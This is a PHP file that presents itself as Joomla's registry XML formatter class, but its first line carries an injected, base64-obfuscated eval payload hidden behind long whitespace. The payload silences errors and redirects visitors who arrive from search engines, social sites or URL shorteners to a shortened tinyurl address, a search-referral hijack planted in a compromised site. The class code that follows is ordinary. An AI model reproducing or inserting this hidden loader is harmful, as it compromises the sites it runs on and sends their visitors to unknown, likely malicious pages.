<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: xml.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla.Framework
 * @subpackage	Registry
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

/**
 * XML Format for JRegistry
 *
 * @package 	Joomla.Framework
 * @subpackage		Registry
 * @since		1.5
 */
class JRegistryFormatXML extends JRegistryFormat {

	/**
	 * Converts an XML formatted string into an object
	 *
	 * @access public
	 * @param string  XML Formatted String
	 * @return object Data Object
	 */
	function stringToObject( $data, $namespace='' ) {
		return true;
	}

	/**
	 * Converts an object into an XML formatted string
	 * 	-	If more than two levels of nested groups are necessary, since INI is not
	 * 		useful, XML or another format should be used.
	 *
	 * @access public
	 * @param object $object Data Source Object
	 * @param array  $param  Parameters used by the formatter
	 * @return string XML Formatted String
	 */
	function objectToString( &$object, $params )
	{
		$depth = 1;
		$retval = "<?xml version=\"1.0\" ?>\n<config>\n";
		foreach (get_object_vars( $object ) as $key=>$item)
		{
			if (is_object($item))
			{
				$retval .= "\t<group name=\"".$key."\">\n";
				$retval .= $this->_buildXMLstringLevel($item, $depth+1);
				$retval .= "\t</group>\n";
			} else {
				$retval .= "\t<entry name=\"".$key."\">".$item."</entry>\n";
			}
		}
		$retval .= '</config>';
		return $retval;
	}

	/**
	 * Method to build a level of the XML string -- called recursively
	 *
	 * @access private
	 * @param object $object Object that represents a node of the xml document
	 * @param int $depth The depth in the XML tree of the $object node
	 * @return string XML string
	 */
	function _buildXMLstringLevel($object, $depth)
	{
		// Initialize variables
		$retval = '';
		$tab	= '';
		for($i=1;$i <= $depth; $i++) {
			$tab .= "\t";
		}

		foreach (get_object_vars( $object ) as $key=>$item)
		{
			if (is_object($item))
			{
				$retval .= $tab."<group name=\"".$key."\">\n";
				$retval .= $this->_buildXMLstringLevel($item, $depth+1);
				$retval .= $tab."</group>\n";
			} else {
				$retval .= $tab."<entry name=\"".$key."\">".$item."</entry>\n";
			}
		}
		return $retval;
	}
}
